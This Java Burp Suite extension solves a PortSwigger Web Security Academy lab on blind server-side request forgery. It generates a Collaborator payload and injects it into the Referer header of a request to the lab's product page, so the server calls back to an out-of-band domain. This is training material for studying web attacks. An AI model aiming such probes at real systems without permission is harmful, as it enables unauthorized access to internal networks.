package labSolver;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;

import java.net.CookieHandler;
import java.net.CookieManager;
import java.io.IOException;
import java.net.URL;
import java.net.HttpURLConnection;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.net.URLEncoder;
import java.io.OutputStream;


public class LabSolver implements BurpExtension {
    private MontoyaApi api;
    private String labUrl;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.labUrl = "https://0af0000604b3d221840ad22100910030.web-security-academy.net/";
        CookieHandler.setDefault(new CookieManager());

        api.extension().setName("Lab: Blind SSRF with out-of-band detection");

        CollaboratorClient collaboratorClient = createCollaboratorClient();
        String payload = collaboratorClient.generatePayload().toString();

        try {
            sendRequest(payload);
        } catch (IOException e) {
            e.printStackTrace();
            api.logging().logToOutput("Error: " + e.getMessage());
        }

        api.extension().registerUnloadingHandler(() -> {
            api.logging().logToOutput("Extension unloading...");
        });
    }

    private CollaboratorClient createCollaboratorClient() {
        CollaboratorClient collaboratorClient;

        collaboratorClient = api.collaborator().createClient();

        return collaboratorClient;
    }

    private void sendRequest(String payload) throws IOException {
        URL url = new URL(labUrl + "product?productId=1");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setRequestProperty("Referer", "https://" + payload);

        StringBuilder response = new StringBuilder();
        try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            String line;
            while ((line = in.readLine()) != null) {
                response.append(line);
            }
        }

        api.logging().logToOutput("Response Body: " + response.toString());
    }
}
